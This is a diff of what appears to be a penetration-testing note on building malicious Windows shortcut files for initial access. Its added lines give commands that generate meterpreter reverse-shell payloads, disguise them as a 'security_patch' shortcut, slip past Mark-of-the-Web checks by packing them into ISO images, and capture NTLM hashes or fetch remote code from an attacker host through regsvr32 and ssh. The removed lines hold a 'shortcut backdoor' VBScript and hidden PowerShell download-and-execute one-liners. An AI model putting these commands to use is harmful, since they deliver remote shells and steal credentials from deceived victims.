@@ -1,6 +1,94 @@
-# Scripts
+# Offensive Tools
 
-## PowerShell
+## 01 - Scripts
+
+### 1.1 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Linux/Offensive Tools|ShortcutGen]]
+
+#### 1.1.1 - Reverse Shell
+
+> [!INFO]
+> After selecting the custom icon ensure to append the suffix with `,0`. This will make PowerShell to treat it as a string instead of a file.
+
+```
+$ mkdir /tmp/payloads/
+
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o /tmp/payloads/payload.exe
+
+$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c start /min %CD%\payload.exe" --icon "C:\Windows\System32\msi.dll,0" -o /tmp/payloads/security_patch.lnk
+```
+
+Pack it into an archive inside a disk image using [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Document File/Windows/Disk Image/Generate Disk Image/Offensive Tools/PackMyPayload/Usage|`packmypayload`]]. It's recommended when evading MOTW in order for the victim to click on the shortcut file.
+
+```
+$ packmypayload -H payload.exe --out-format zip /tmp/payloads/ archive.zip
+
+$ packmypayload --out-format iso /tmp/payloads/ Patches.iso
+
+$ rm archive.zip
+```
+
+#### 1.1.2 - Capture NTLM Relay
+
+```
+$ shortcutgen -p lnk -i "FILESERVER" -s "Documents" -n "document.docx" -d "A hosting server." -o fileserver.lnk
+```
+
+### 1.2 - PyLNK
+
+#### 1.2.1 - Setup
+
+##### 1.2.1.1 - Package Manager
+
+Install it according to your package manager.
+
+```
+$ yay -S python-pylnk3
+```
+
+##### 1.2.1.2 - Universal Install
+
+```
+$ git clone https://github.com/strayge/pylnk.git && \
+sudo python3 setup.py install
+```
+
+### 2.2 - Generate Payload
+
+#### 2.2.1 - Reverse Shell
+
+```
+$ pylnk3 c C:\Windows\System32\cmd.exe payload.lnk -a "/c payload.exe" -ii <index_number> -m Minimized -d "<description>"
+```
+
+```
+$ pylnk3 c C:\Windows\System32\cmd.exe payload.lnk -a "/c payload.exe" -i /path/to/file.ext -m Minimized -d "<description>"
+```
+
+#### 2.2.2 - Capture NTLM Relay
+
+```
+$ pylnk c \\<attacker_IP>\<share_name>\@snare.txt shortcut_file.lnk
+
+$ pylnk c \\<attacker_IP>\<share_name>\snare.txt shortcut_file.lnk
+```
+
+Scriptlet file
+
+```
+$ pylnk c C:\Windows\System32\regsvr32.exe -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" payload.lnk
+```
+
+```
+$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "\\<attacker_IP>\key.pem root@<IP>" payload.lnk
+```
+
+TODO: Provide use cases if any (refer to the link for SSH)
+
+```
+$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "-o \"PermitLocalCommand=yes\" -o \"LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc\" <username>@<attacker_IP>" payload.lnk
+```
+
+### 1.3 - PowerShell
 
 ```powershell
 $ErrorActionPreference = "Stop" # Halt on any error
@@ -106,37 +194,26 @@ try {
 }
 ```
 
-### 2.2 - VBScript
-
-```vbscript
-Set ObjectWScript = WScript.CreateObject("WScript.Shell")
-
-' Arguments: target executable, target arguments, shortcut file
-stringTargetPath = WScript.Arguments(0)
-stringTargetArguments = WScript.Arguments(1)
-ShortcutFile = WScript.Arguments(2)
-
-Set objLink = ObjectWScript.CreateShortcut(ShortcutFile)
-
-objLink.TargetPath = stringTargetPath
-objLink.Arguments = stringTargetArguments
-objLink.Description = "A shortcut backdoor"
-objLink.IconLocation = "shell32.dll,21"
-objLink.WindowStyle = 7 ' 1 - Normal, 3 - Maximized, 7 - Minimized
-objLink.WorkingDirectory = "C:\Users\Public"
-objLink.Save
-```
-
-To execute the script with `wine` by generating a shortcut `.lnk` file.
-
-```
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/payload.ps1'))""" payload.lnk
-
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "/c powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/payload.ps1'))""" payload.lnk
-```
-
 ---
 ## References
+
+### Backlinks
+
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Manual]]
+
+### Source Repositories
+
+- [strayge: pylnk](https://github.com/strayge/pylnk)
+
+- [rvrsh3ll: `Create-HotKeyLNK.ps1`](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)
+
+### Pentestlab
+
+- [Pentestlab Blog: Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)
+
+### Hacking Articles
+
+- [Hacking Articles: Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/)
 
 ### Uperesia
 
